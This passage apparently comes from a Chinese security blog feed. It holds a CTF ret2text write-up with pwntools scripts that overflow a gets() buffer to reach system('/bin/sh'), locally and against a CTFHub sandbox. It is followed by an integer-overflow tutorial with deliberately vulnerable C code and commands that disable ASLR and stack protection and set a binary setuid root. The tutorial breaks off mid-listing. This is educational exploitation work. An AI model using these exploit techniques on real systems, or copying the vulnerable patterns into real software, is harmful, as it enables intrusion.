0x2</h1><p>我们把程序拉进 ida 反汇编一下：<br><img src="/2022/09/05/ret2text/image-20220903170605745.png" alt="image-20220903170605745"></p><p>按 F5 反汇编，程序很简单，就是输入输出，这里用了 gets() 函数来获取输入，栈溢出确凿无疑了。<br><img src="/2022/09/05/ret2text/image-20220903170641096.png" alt="image-20220903170641096"></p><blockquote><p>gets()函数用于从缓冲区中读取字符串，其原型如下：<br>char *gets(char *string);</p><p>gets()函数从流中读取字符串，直到出现换行符或读到文件尾为止，最后加上NULL作为字符串结束。所读取的字符串暂存在给定的参数string中。</p><p>【返回值】若成功则返回string的指针，否则返回NULL。</p><p>注意：由于gets()不检查字符串string的大小，必须遇到换行符或文件结尾才会结束输入，因此容易造成缓存溢出的安全性问题，导致程序崩溃，可以使用fgets()代替。<br>————————————————<br>博主「改个名字真不容易�」<br>原文链接：<a href="https://blog.csdn.net/weixin_44010117/article/details/107866101">https://blog.csdn.net/weixin_44010117/article/details/107866101</a></p></blockquote><p>但是并没看到跟 flag 相关的信息。继续看，发现还有个 <code>secure</code> 函数。<br><img src="/2022/09/05/ret2text/image-20220903171624728.png" alt="image-20220903171624728"></p><p>函数中调用了 <code>system('/bin/sh')</code>，所以猜测获取 flag 是通过执行 <code>system</code> 获得 shell，然后再执行命令。</p><h1 id="0x3"><a class="markdownIt-Anchor" href="#0x3"></a> 0x3</h1><p><strong>思路梳理：</strong></p><p>从 IDA 中可以看出，pwn 程序只有这两个用户函数，其他的都是库函数。因此答案就在这两个函数中。停下来想想我们已知的内容：</p><ul><li>main 函数调用了 gets()，且未限制长度，存在栈溢出，是解题的入口</li><li>secure 函数调用了 system(‘bin/sh’)，是解题的出口</li></ul><blockquote><p>**栈溢出的原理：**溢出溢出，字面上就是往容器里加的水超过了水的容积，简单讲，栈溢出就是向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，造成溢出。</p><p><strong>发生栈溢出的条件</strong>：程序必须向栈上写入数据。写入的数据大小没有被良好地控制。</p><p><strong>利用方式</strong>：覆盖程序的返回地址为攻击者所控制的地址，比如该地址为执行shellcode的地址shellcode是一段用于利用软件漏洞而执行的代码，shellcode为16进制的机器码，可以让攻击者获得shell，利用pwntools可自动生成，等用到再说。</p><p><strong>可能造成栈溢出的函数有：gets,scanf,vscanf,sprintf,strcpy,strcat，bcopy</strong></p></blockquote><p>根据栈溢出原理，我们可以通过输入超长字符串来溢出 v4[112] 数组，进而覆盖掉 RBP。</p><p>这时，我们只要用 system(‘bin/sh’) 的入口地址，来覆盖 RBP，就能获得 shell。</p><h1 id="0x4"><a class="markdownIt-Anchor" href="#0x4"></a> 0x4</h1><p>梳理一下我们<strong>需要获取的信息</strong>：</p><ul><li>system(‘bin/sh’) 的入口地址</li><li>v4[0] 与 RBP 间的距离</li></ul><p>system(‘bin/sh’) 入口地址直接在 ida 中就能找到：0x4007B8</p><p><img src="/2022/09/05/ret2text/image-20220903172832504.png" alt="image-20220903172832504"></p><p>至于 v4[0] 与 RBP 间的距离 我们可以通过调试计算获得：</p><p>v4[0]  &lt;----&gt;  [rbp-0x70]，由于是64位操作系统，所以 距离：0x70 + 8 = 120<sub>10</sub><br><img src="/2022/09/05/ret2text/image-20220903173129005.png" alt="image-20220903173129005"></p><p>关于距离计算，其实 gdb 插件 peda 就能够自动获取这个长度：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda pwn</span><br><span class="line">pattern create 200     //制造200个填充字符（多少字符都行），先把他复制下来</span><br><span class="line">r                      //运行程序</span><br><span class="line"></span><br><span class="line">pattern offset 地址     //ret 地址，确定偏移</span><br></pre></td></tr></table></figure><p><img src="/2022/09/05/ret2text/image-20220903175659627.png" alt="image-20220903175659627"></p><p><img src="/2022/09/05/ret2text/image-20220903175730446.png" alt="image-20220903175730446"></p><p><img src="/2022/09/05/ret2text/image-20220903175829667.png" alt="image-20220903175829667"></p><h1 id="0x5"><a class="markdownIt-Anchor" href="#0x5"></a> 0x5</h1><p><strong>编写 exp</strong></p><p>先写一个本地的exp 方便调试</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*  <span class="comment"># 导入 pwntools库 </span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)<span class="comment"># 执行 pwn</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">120</span> + p64(<span class="number">0x4007B8</span>)<span class="comment"># p32()将其转换为字节流，64应用p64()</span></span><br><span class="line">p.sendline(payload)<span class="comment"># 发送 payload</span></span><br><span class="line">p.interactive()<span class="comment"># 进行交互，即运行shell</span></span><br></pre></td></tr></table></figure><p><img src="/2022/09/05/ret2text/image-20220903182737742.png" alt="image-20220903182737742"></p><p>再来写远程的 exp</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">p = connect(&#x27;challenge-4a6f183db92b776b.sandbox.ctfhub.com&#x27;,26016)</span><br><span class="line"></span><br><span class="line">payload = b&#x27;a&#x27;*120 + p64(0x4007B8)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><img src="/2022/09/05/ret2text/image-20220903165012377.png" alt="image-20220903165012377" style="zoom:80%;"><p>成功获得 flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x0&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#0x0&quot;&gt;&lt;/a&gt; 0x0&lt;/h1&gt;
&lt;p&gt;配置好基本环境&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;安装gdb：通过apt-get install build-essential安装基本的编译环境</summary>
      
    
    
    
    <category term="CTF" scheme="https://www.rgzzplus.com/categories/CTF/"/>
    
    
    <category term="ret2text" scheme="https://www.rgzzplus.com/tags/ret2text/"/>
    
  </entry>
  
  <entry>
    <title>整数安全</title>
    <link href="https://www.rgzzplus.com/2022/08/27/%E6%95%B4%E6%95%B0%E5%AE%89%E5%85%A8/"/>
    <id>https://www.rgzzplus.com/2022/08/27/%E6%95%B4%E6%95%B0%E5%AE%89%E5%85%A8/</id>
    <published>2022-08-27T04:48:59.000Z</published>
    <updated>2022-08-27T04:49:22.367Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="1-什么是整数溢出"><a class="markdownIt-Anchor" href="#1-什么是整数溢出"></a> 1. 什么是整数溢出</h2><h3 id="11-简介"><a class="markdownIt-Anchor" href="#11-简介"></a> 1.1 简介</h3><p>在 C 语言基础的章节中，我们介绍了 C 语言整数的基础知识，下面我们详细介绍整数的安全问题。</p><p>由于整数在内存里面保存在一个固定长度的空间内，它能存储的最大值和最小值是固定的，如果我们尝试去存储一个数，而这个数又大于这个固定的最大值时，就会导致整数溢出。（x86-32 的数据模型是 ILP32，即整数（Int）、长整数（Long）和指针（Pointer）都是 32 位。）</p><h3 id="12-整数溢出的危害"><a class="markdownIt-Anchor" href="#12-整数溢出的危害"></a> 1.2 整数溢出的危害</h3><p>如果一个整数用来计算一些敏感数值，如缓冲区大小或数值索引，就会产生潜在的危险。通常情况下，整数溢出并没有改写额外的内存，不会直接导致任意代码执行，但是它会导致栈溢出和堆溢出，而后两者都会导致任意代码执行。由于整数溢出出现之后，很难被立即察觉，比较难用一个有效的方法去判断是否出现或者可能出现整数溢出。</p><h2 id="2-整数溢出"><a class="markdownIt-Anchor" href="#2-整数溢出"></a> 2. 整数溢出</h2><p>关于整数的异常情况主要有三种：</p><ul><li>溢出<ul><li>只有有符号数才会发生溢出。有符号数最高位表示符号，在两正或两负相加时，有可能改变符号位的值，产生溢出</li><li>溢出标志 <code>OF</code> 可检测有符号数的溢出</li></ul></li><li>回绕<ul><li>无符号数 <code>0-1</code> 时会变成最大的数，如 1 字节的无符号数会变为 <code>255</code>，而 <code>255+1</code> 会变成最小数 <code>0</code>。</li><li>进位标志 <code>CF</code> 可检测无符号数的回绕</li></ul></li><li>截断<ul><li>将一个较大宽度的数存入一个宽度小的操作数中，高位发生截断</li></ul></li></ul><h3 id="21-有符号整数溢出"><a class="markdownIt-Anchor" href="#21-有符号整数溢出"></a> 2.1 有符号整数溢出</h3><ul><li>上溢出</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> i;</span><br><span class="line">i = INT_MAX;  <span class="comment">// 2 147 483 647</span></span><br><span class="line">i++;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;i = %d\n&quot;</span>, i);  <span class="comment">// i = -2 147 483 648</span></span><br></pre></td></tr></table></figure><ul><li>下溢出</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">i = INT_MIN;  <span class="comment">// -2 147 483 648</span></span><br><span class="line">i--;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;i = %d\n&quot;</span>, i);  <span class="comment">// i = 2 147 483 647</span></span><br></pre></td></tr></table></figure><h3 id="22-无符号数回绕"><a class="markdownIt-Anchor" href="#22-无符号数回绕"></a> 2.2 无符号数回绕</h3><p>涉及无符号数的计算永远不会溢出，因为不能用结果为无符号整数表示的结果值被该类型可以表示的最大值加 1 之和取模减（reduced modulo）。因为回绕，一个无符号整数表达式永远无法求出小于零的值。</p><p>使用下图直观地理解回绕，在轮上按顺时针方向将值递增产生的值紧挨着它：</p><p><img src="/2022/08/27/%E6%95%B4%E6%95%B0%E5%AE%89%E5%85%A8/1.5.1_unsigned_integer.png" alt="img"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> ui;</span><br><span class="line">ui = UINT_MAX;  <span class="comment">// 在 x86-32 上为 4 294 967 295</span></span><br><span class="line">ui++;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ui = %u\n&quot;</span>, ui);  <span class="comment">// ui = 0</span></span><br><span class="line">ui = <span class="number">0</span>;</span><br><span class="line">ui--;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ui = %u\n&quot;</span>, ui);  <span class="comment">// 在 x86-32 上，ui = 4 294 967 295</span></span><br></pre></td></tr></table></figure><h3 id="23-截断"><a class="markdownIt-Anchor" href="#23-截断"></a> 2.3 截断</h3><ul><li>加法截断：</li></ul><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0xffffffff + 0x00000001</span><br><span class="line">= 0x0000000100000000 (long long)</span><br><span class="line">= 0x00000000 (long)</span><br></pre></td></tr></table></figure><ul><li>乘法截断：</li></ul><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x00123456 * 0x00654321</span><br><span class="line">= 0x000007336BF94116 (long long)</span><br><span class="line">= 0x6BF94116 (long)</span><br></pre></td></tr></table></figure><h3 id="24-整型提升和宽度溢出"><a class="markdownIt-Anchor" href="#24-整型提升和宽度溢出"></a> 2.4 整型提升和宽度溢出</h3><p>整型提升是指当计算表达式中包含了不同宽度的操作数时，较小宽度的操作数会被提升到和较大操作数一样的宽度，然后再进行计算。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> l;  </span><br><span class="line">    <span class="type">short</span> s;</span><br><span class="line">    <span class="type">char</span> c;</span><br><span class="line"></span><br><span class="line">    l = <span class="number">0xabcddcba</span>;</span><br><span class="line">    s = l;</span><br><span class="line">    c = l;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;宽度溢出\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;l = 0x%x (%d bits)\n&quot;</span>, l, <span class="keyword">sizeof</span>(l) * <span class="number">8</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;s = 0x%x (%d bits)\n&quot;</span>, s, <span class="keyword">sizeof</span>(s) * <span class="number">8</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;c = 0x%x (%d bits)\n&quot;</span>, c, <span class="keyword">sizeof</span>(c) * <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;整型提升\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;s + c = 0x%x (%d bits)\n&quot;</span>, s+c, <span class="keyword">sizeof</span>(s+c) * <span class="number">8</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">./a.out</span></span><br><span class="line">宽度溢出</span><br><span class="line">l = 0xabcddcba (32 bits)</span><br><span class="line">s = 0xffffdcba (16 bits)</span><br><span class="line">c = 0xffffffba (8 bits)</span><br><span class="line">整型提升</span><br><span class="line">s + c = 0xffffdc74 (32 bits)</span><br></pre></td></tr></table></figure><p>使用 gdb 查看反汇编代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ disassemble main</span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">   0x0000000000001169 &lt;+0&gt;:endbr64 </span><br><span class="line">   0x000000000000116d &lt;+4&gt;:push   rbp</span><br><span class="line">   0x000000000000116e &lt;+5&gt;:mov    rbp,rsp</span><br><span class="line">   0x0000000000001171 &lt;+8&gt;:sub    rsp,0x10</span><br><span class="line">   0x0000000000001175 &lt;+12&gt;:mov    DWORD PTR [rbp-0x4],0xabcddcba</span><br><span class="line">   0x000000000000117c &lt;+19&gt;:mov    eax,DWORD PTR [rbp-0x4]</span><br><span class="line">   0x000000000000117f &lt;+22&gt;:mov    WORD PTR [rbp-0x6],ax</span><br><span class="line">   0x0000000000001183 &lt;+26&gt;:mov    eax,DWORD PTR [rbp-0x4]</span><br><span class="line">   0x0000000000001186 &lt;+29&gt;:mov    BYTE PTR [rbp-0x7],al</span><br><span class="line">   0x0000000000001189 &lt;+32&gt;:lea    rdi,[rip+0xe74]        # 0x2004</span><br><span class="line">   0x0000000000001190 &lt;+39&gt;:call   0x1060 &lt;puts@plt&gt;</span><br><span class="line">   0x0000000000001195 &lt;+44&gt;:mov    eax,DWORD PTR [rbp-0x4]</span><br><span class="line">   0x0000000000001198 &lt;+47&gt;:mov    edx,0x20</span><br><span class="line">   0x000000000000119d &lt;+52&gt;:mov    esi,eax</span><br><span class="line">   0x000000000000119f &lt;+54&gt;:lea    rdi,[rip+0xe6b]        # 0x2011</span><br><span class="line">   0x00000000000011a6 &lt;+61&gt;:mov    eax,0x0</span><br><span class="line">   0x00000000000011ab &lt;+66&gt;:call   0x1070 &lt;printf@plt&gt;</span><br><span class="line">   0x00000000000011b0 &lt;+71&gt;:movsx  eax,WORD PTR [rbp-0x6]</span><br><span class="line">   0x00000000000011b4 &lt;+75&gt;:mov    edx,0x10</span><br><span class="line">   0x00000000000011b9 &lt;+80&gt;:mov    esi,eax</span><br><span class="line">   0x00000000000011bb &lt;+82&gt;:lea    rdi,[rip+0xe63]        # 0x2025</span><br><span class="line">   0x00000000000011c2 &lt;+89&gt;:mov    eax,0x0</span><br><span class="line">   0x00000000000011c7 &lt;+94&gt;:call   0x1070 &lt;printf@plt&gt;</span><br><span class="line">   0x00000000000011cc &lt;+99&gt;:movsx  eax,BYTE PTR [rbp-0x7]</span><br><span class="line">   0x00000000000011d0 &lt;+103&gt;:mov    edx,0x8</span><br><span class="line">   0x00000000000011d5 &lt;+108&gt;:mov    esi,eax</span><br><span class="line">   0x00000000000011d7 &lt;+110&gt;:lea    rdi,[rip+0xe5b]        # 0x2039</span><br><span class="line">   0x00000000000011de &lt;+117&gt;:mov    eax,0x0</span><br><span class="line">   0x00000000000011e3 &lt;+122&gt;:call   0x1070 &lt;printf@plt&gt;</span><br><span class="line">   0x00000000000011e8 &lt;+127&gt;:lea    rdi,[rip+0xe5e]        # 0x204d</span><br><span class="line">   0x00000000000011ef &lt;+134&gt;:call   0x1060 &lt;puts@plt&gt;</span><br><span class="line">   0x00000000000011f4 &lt;+139&gt;:movsx  edx,WORD PTR [rbp-0x6]</span><br><span class="line">   0x00000000000011f8 &lt;+143&gt;:movsx  eax,BYTE PTR [rbp-0x7]</span><br><span class="line">   0x00000000000011fc &lt;+147&gt;:add    eax,edx</span><br><span class="line">   0x00000000000011fe &lt;+149&gt;:mov    edx,0x20</span><br><span class="line">   0x0000000000001203 &lt;+154&gt;:mov    esi,eax</span><br><span class="line">   0x0000000000001205 &lt;+156&gt;:lea    rdi,[rip+0xe4e]        # 0x205a</span><br><span class="line">   0x000000000000120c &lt;+163&gt;:mov    eax,0x0</span><br><span class="line">   0x0000000000001211 &lt;+168&gt;:call   0x1070 &lt;printf@plt&gt;</span><br><span class="line">   0x0000000000001216 &lt;+173&gt;:nop</span><br><span class="line">   0x0000000000001217 &lt;+174&gt;:leave  </span><br><span class="line">   0x0000000000001218 &lt;+175&gt;:ret    </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><p>在整数转换的过程中，有可能导致下面的错误：</p><ul><li>损失值：转换为值的大小不能表示的一种类型</li><li>损失符号：从有符号类型转换为无符号类型，导致损失符号</li></ul><h3 id="25-漏洞多发函数"><a class="markdownIt-Anchor" href="#25-漏洞多发函数"></a> 2.5 漏洞多发函数</h3><p>我们说过整数溢出要配合上其他类型的缺陷才能有用，下面的两个函数都有一个 <code>size_t</code> 类型的参数，常常被误用而产生整数溢出，接着就可能导致缓冲区溢出漏洞。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">memcpy</span><span class="params">(<span class="type">void</span> *dest, <span class="type">const</span> <span class="type">void</span> *src, <span class="type">size_t</span> n)</span>;</span><br></pre></td></tr></table></figure><p><code>memcpy()</code> 函数将 <code>src</code> 所指向的字符串中以 <code>src</code> 地址开始的前 <code>n</code> 个字节复制到 <code>dest</code> 所指的数组中，并返回 <code>dest</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *<span class="title function_">strncpy</span><span class="params">(<span class="type">char</span> *dest, <span class="type">const</span> <span class="type">char</span> *src, <span class="type">size_t</span> n)</span>;</span><br></pre></td></tr></table></figure><p><code>strncpy()</code> 函数从源 <code>src</code> 所指的内存地址的起始位置开始复制 <code>n</code> 个字节到目标 <code>dest</code> 所指的内存地址的起始位置中。</p><p>两个函数中都有一个类型为 <code>size_t</code> 的参数，它是无符号整型的 <code>sizeof</code> 运算符的结果。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">int</span> <span class="type">size_t</span>;</span><br></pre></td></tr></table></figure><h2 id="3-整数溢出示例"><a class="markdownIt-Anchor" href="#3-整数溢出示例"></a> 3. 整数溢出示例</h2><p>现在我们已经知道了整数溢出的原理和主要形式，下面我们先看几个简单示例，然后实际操作利用一个整数溢出漏洞。</p><h3 id="31-示例"><a class="markdownIt-Anchor" href="#31-示例"></a> 3.1 示例</h3><p>示例一，整数转换：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> buf[<span class="number">80</span>];</span><br><span class="line"><span class="type">void</span> <span class="title function_">vulnerable</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> len = read_int_from_network();</span><br><span class="line">    <span class="type">char</span> *p = read_string_from_network();</span><br><span class="line">    <span class="keyword">if</span> (len &gt; <span class="number">80</span>) &#123;</span><br><span class="line">        error(<span class="string">&quot;length too large: bad dog, no cookie for you!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memcpy</span>(buf, p, len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个例子的问题在于，如果攻击者给 <code>len</code> 赋于了一个负数，则可以绕过 <code>if</code> 语句的检测，而执行到 <code>memcpy()</code> 的时候，由于第三个参数是 <code>size_t</code> 类型，负数 <code>len</code> 会被转换为一个无符号整型，它可能是一个非常大的正数，从而复制了大量的内容到 <code>buf</code> 中，引发了缓冲区溢出。</p><p>示例二，回绕和溢出：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">vulnerable</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">size_t</span> len;</span><br><span class="line">    <span class="comment">// int len;</span></span><br><span class="line">    <span class="type">char</span>* buf;</span><br><span class="line"></span><br><span class="line">    len = read_int_from_network();</span><br><span class="line">    buf = <span class="built_in">malloc</span>(len + <span class="number">5</span>);</span><br><span class="line">    read(fd, buf, len);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个例子看似避开了缓冲区溢出的问题，但是如果 <code>len</code> 过大，<code>len+5</code> 有可能发生回绕。比如说，在 x86-32 上，如果 <code>len = 0xFFFFFFFF</code>，则 <code>len+5 = 0x00000004</code>，这时 <code>malloc()</code> 只分配了 4 字节的内存区域，然后在里面写入大量的数据，缓冲区溢出也就发生了。（如果将 <code>len</code> 声明为有符号 <code>int</code> 类型，<code>len+5</code> 可能发生溢出）</p><p>示例三，截断：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> total;</span><br><span class="line">    total = <span class="built_in">strlen</span>(argv[<span class="number">1</span>]) + <span class="built_in">strlen</span>(argv[<span class="number">2</span>]) + <span class="number">1</span>;</span><br><span class="line">    <span class="type">char</span> *buf = (<span class="type">char</span> *)<span class="built_in">malloc</span>(total);</span><br><span class="line">    <span class="built_in">strcpy</span>(buf, argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">strcat</span>(buf, argv[<span class="number">2</span>]);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个例子接受两个字符串类型的参数并计算它们的总长度，程序分配足够的内存来存储拼接后的字符串。首先将第一个字符串参数复制到缓冲区中，然后将第二个参数连接到尾部。如果攻击者提供的两个字符串总长度无法用 <code>total</code> 表示，则会发生截断，从而导致后面的缓冲区溢出。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">validate_passwd</span><span class="params">(<span class="type">char</span> *passwd)</span> &#123;</span><br><span class="line">    <span class="type">char</span> passwd_buf[<span class="number">11</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> passwd_len = <span class="built_in">strlen</span>(passwd);</span><br><span class="line">    <span class="keyword">if</span>(passwd_len &gt;= <span class="number">4</span> &amp;&amp; passwd_len &lt;= <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;good!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">strcpy</span>(passwd_buf, passwd);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;bad!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">    validate_passwd(argv[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的程序中 <code>strlen()</code> 返回类型是 <code>size_t</code>，却被存储在无符号字符串类型中，任意超过无符号字符串最大上限值（256 字节）的数据都会导致截断异常。当密码长度为 261 时，截断后值变为 5，成功绕过了 <code>if</code> 的判断，导致栈溢出。下面我们利用溢出漏洞来获得 shell。</p><p>编译命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># </span><span class="language-bash"><span class="built_in">echo</span> 0&gt; /proc/sys/kernel/randomize_va_space</span></span><br><span class="line"><span class="meta">$ </span><span class="language-bash">gcc -g -fno-stack-protector -z execstack -o vuln vuln.c</span></span><br><span class="line"><span class="meta">$ </span><span class="language-bash">sudo <span class="built_in">chown</span> root vuln</span></span><br><span class="line"><span class="meta">$ </span><span class="language-bash">sudo <span class="built_in">chgrp</span> root vuln</span></span><br><span class="line"><span class="meta">$ </span><span class="language-bash">sudo <span class="built_in">chmod</span> +s vuln</span></span><br></pre></td></tr></table></figure><p>使用 gdb 反汇编 <code>validate_passwd</code> 函数。<mark>rdi,rsi,rdx,rcx,r8,r9</mark></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 